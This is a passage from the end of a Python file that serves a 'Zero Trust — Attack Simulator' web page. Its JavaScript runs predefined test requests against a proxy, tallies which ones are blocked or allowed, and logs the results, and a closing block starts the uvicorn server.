    if (data.total > 1) {
      resultDiv.className = 'card-result running show';
      resultDiv.textContent = `⏳ Request ${data.index}/${data.total} — HTTP ${data.status_code || '?'}`;
    }

    if (data.done) {
      evtSource.close();
      btn.disabled = false;
      stats.pending = Math.max(0, stats.pending - 1);
      stats.total++;

      if (data.blocked) {
        stats.blocked++;
        card.className = 'attack-card blocked';
        resultDiv.className = 'card-result blocked show';
        resultDiv.textContent = `🛡 BLOCKED — HTTP ${data.status_code} (${data.elapsed_ms}ms)`;
        log('blocked', `  🚫 BLOCKED  ${data.method} ${data.url} → ${data.status_code} (${data.elapsed_ms}ms)`);
      } else {
        stats.allowed++;
        card.className = 'attack-card allowed';
        resultDiv.className = 'card-result allowed show';
        resultDiv.textContent = `✓ PASSED — HTTP ${data.status_code} (${data.elapsed_ms}ms)`;
        log('allowed', `  ✅ ALLOWED  ${data.method} ${data.url} → ${data.status_code} (${data.elapsed_ms}ms)`);
      }

      updateStats();
    }
  };

  evtSource.onerror = () => {
    evtSource.close();
    btn.disabled = false;
    stats.pending = Math.max(0, stats.pending - 1);
    updateStats();
    card.className = 'attack-card error';
    resultDiv.className = 'card-result error show';
    resultDiv.textContent = '⚠ Connection error';
    log('warn', `  ✗ SSE connection error for ${id}`);
  };
}

// ---- Run ALL attacks sequentially ----
async function runAll() {
  if (running) return;
  running = true;

  const allBtn = document.querySelector('.btn-run-all');
  allBtn.disabled = true;
  allBtn.textContent = '⏳ RUNNING...';

  const progressBar = document.getElementById('progress-bar');
  const progressFill = document.getElementById('progress-fill');
  progressBar.classList.add('show');

  // Reset stats
  stats = { total: 0, blocked: 0, allowed: 0, pending: 0 };
  updateStats();

  log('info', '═'.repeat(48));
  log('info', '  LAUNCHING ALL ATTACKS');
  log('info', '═'.repeat(48));

  const ids = attacks.map(a => a.id);
  for (let i = 0; i < ids.length; i++) {
    await runSinglePromise(ids[i]);
    progressFill.style.width = `${((i + 1) / ids.length) * 100}%`;
    await sleep(150);
  }

  log('info', '─'.repeat(48));
  log('info', `  DONE — ${stats.blocked} blocked / ${stats.allowed} allowed / ${stats.total} total`);
  log('info', '─'.repeat(48));

  allBtn.disabled = false;
  allBtn.textContent = '▶ LAUNCH ALL ATTACKS';
  running = false;
}

// Promise wrapper around runSingle so runAll can await it
function runSinglePromise(id) {
  return new Promise((resolve) => {
    const card = document.getElementById(`card-${id}`);
    const resultDiv = document.getElementById(`result-${id}`);
    const btn = document.getElementById(`btn-${id}`);

    card.className = 'attack-card running';
    btn.disabled = true;
    resultDiv.className = 'card-result running show';
    resultDiv.textContent = '⏳ Firing...';
    stats.pending++;
    updateStats();
    log('info', `→ ${id}`);

    const evtSource = new EventSource(`/run/${id}`);

    evtSource.onmessage = (e) => {
      const data = JSON.parse(e.data);
      if (data.error) {
        card.className = 'attack-card error';
        resultDiv.className = 'card-result error show';
        resultDiv.textContent = `⚠ ${data.error}`;
        log('warn', `  ✗ ${data.error}`);
        stats.pending = Math.max(0,stats.pending-1); stats.total++;
        updateStats(); evtSource.close(); btn.disabled=false; resolve(); return;
      }
      if (data.total > 1) {
        resultDiv.textContent = `⏳ ${data.index}/${data.total}`;
      }
      if (data.done) {
        evtSource.close(); btn.disabled=false;
        stats.pending = Math.max(0,stats.pending-1); stats.total++;
        if (data.blocked) {
          stats.blocked++;
          card.className='attack-card blocked';
          resultDiv.className='card-result blocked show';
          resultDiv.textContent=`🛡 BLOCKED — HTTP ${data.status_code} (${data.elapsed_ms}ms)`;
          log('blocked',`  🚫 BLOCKED  ${data.method} ${data.url} → ${data.status_code}`);
        } else {
          stats.allowed++;
          card.className='attack-card allowed';
          resultDiv.className='card-result allowed show';
          resultDiv.textContent=`✓ PASSED — HTTP ${data.status_code} (${data.elapsed_ms}ms)`;
          log('allowed',`  ✅ PASSED   ${data.method} ${data.url} → ${data.status_code}`);
        }
        updateStats(); resolve();
      }
    };
    evtSource.onerror = () => {
      evtSource.close(); btn.disabled=false;
      stats.pending=Math.max(0,stats.pending-1); updateStats();
      card.className='attack-card error';
      resultDiv.className='card-result error show';
      resultDiv.textContent='⚠ Connection error';
      resolve();
    };
  });
}

// ---- Stats ----
function updateStats() {
  document.getElementById('stat-total').textContent   = stats.total;
  document.getElementById('stat-blocked').textContent = stats.blocked;
  document.getElementById('stat-allowed').textContent = stats.allowed;
  document.getElementById('stat-pending').textContent = stats.pending;
}

// ---- Terminal log ----
function log(type, msg) {
  const term = document.getElementById('terminal');
  const cursor = term.querySelector('.cursor');
  const line = document.createElement('span');
  line.className = `log-line ${type}`;
  line.textContent = msg;
  term.insertBefore(line, cursor);
  term.insertBefore(document.createElement('br'), cursor);
  term.scrollTop = term.scrollHeight;

  // Keep only last 200 lines
  const lines = term.querySelectorAll('.log-line');
  if (lines.length > 200) lines[0].previousSibling?.remove(), lines[0].remove();
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

init();
</script>
</body>
</html>
"""

# =============================================================================
# ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  Zero Trust — Attack Simulator")
    print("=" * 60)
    print(f"  UI:     http://localhost:{SIMULATOR_PORT}")
    print(f"  Target: {PROXY_TARGET}")
    print()
    print("  To expose via ngrok:")
    print(f"    ngrok http {SIMULATOR_PORT}")
    print()
    print("  To change the proxy target, edit PROXY_TARGET at the top of this file.")
    print("=" * 60)

    uvicorn.run(app, host="0.0.0.0", port=SIMULATOR_PORT, log_level="warning")